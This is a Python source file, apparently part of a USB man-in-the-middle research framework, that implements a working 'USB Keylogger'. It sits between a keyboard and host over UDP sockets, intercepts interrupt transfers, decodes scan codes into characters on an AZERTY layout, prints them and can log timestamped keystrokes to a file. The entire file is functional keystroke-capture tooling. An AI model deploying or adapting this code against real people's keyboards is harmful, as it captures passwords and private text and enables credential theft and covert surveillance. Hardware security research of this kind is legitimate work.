#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
  Receiver
"""

import sys
import struct
import traceback
import time

try:
    import argparse
except:
    print("python-argparse is needed")
    sys.exit(1)

from usbmitm.comm.udp import USBSocketDevice, USBSocketHost
from usbmitm.utils import *
from usbmitm.base import Forwarder

from usbmitm.dissect.usbmitm_proto import *
import usbmitm.device.azerty as keyboard


def extract_usb_part(data):
    return data[8:]


def is_usb_msg(data):
    """ Return True if data is a USB Message
    Dissection could be used, but probability of failing is higher """
    return struct.unpack("<II", data[:8])[1] == 0


def extract_ep(data):
    """ Extract type and direction endpoint, data """
    if not is_usb_msg(data):
        return None
    i, t, d = struct.unpack("<HII", data[8:18])
    return (i, usbmessage_urb_type[t], usbmessage_urb_dir[d])


def lhex(msg):
    return " ".join([x.encode("hex") for x in str(msg)])


class Keylogger(Forwarder):
    _desc_ = "USB Keylogger"
    DEVICE = USBSocketDevice
    HOST = USBSocketHost

    @classmethod
    def create_arg_subparser(cls, parser):
        parser.add_argument(
            "--no-release", action="store_true", help="Do not output release keys"
        )
        parser.add_argument(
            "--no-interpret", action="store_true", help="Do not interpret key"
        )
        parser.add_argument(
            "--output", "-o", metavar="FILE", help="Store all scan code to files"
        )

    def __init__(self, args):
        Forwarder.__init__(self, args)
        self.release = not args.no_release
        self.fout = args.output

        # Empty file
        if self.fout:
            open(self.fout, "w").close()

    def hookDevice(self, data):
        try:
            self.extract_key(data)
        except:
            traceback.print_exc()
        return data

    def raw_append(self, scan):
        with open(self.fout, "a") as f:
            f.write("%s %s\n" % (str(time.time()), scan))

    def output(self, scancode):
        if self.args.no_interpret:
            print(scancode.encode("hex"))
        else:
            if scancode[2] != "\x00":
                sys.stdout.write(keyboard.get_char(scancode))
                sys.stdout.flush()

    def extract_key(self, data):
        msg = USBMessageDevice(data)
        if msg.type == 0 and msg.content.ep.is_interrupt():
            keyscan = str(msg.content.data)
            if self.fout:
                self.raw_append(keyscan)
            if keyscan[2] != "\x00" or self.release:
                self.output(str(msg.content.data))


if __name__ == "__main__":
    parser = Keylogger.create_arg_parser()
    args = parser.parse_args()
    keylogger = Keylogger(args)
    keylogger.run()
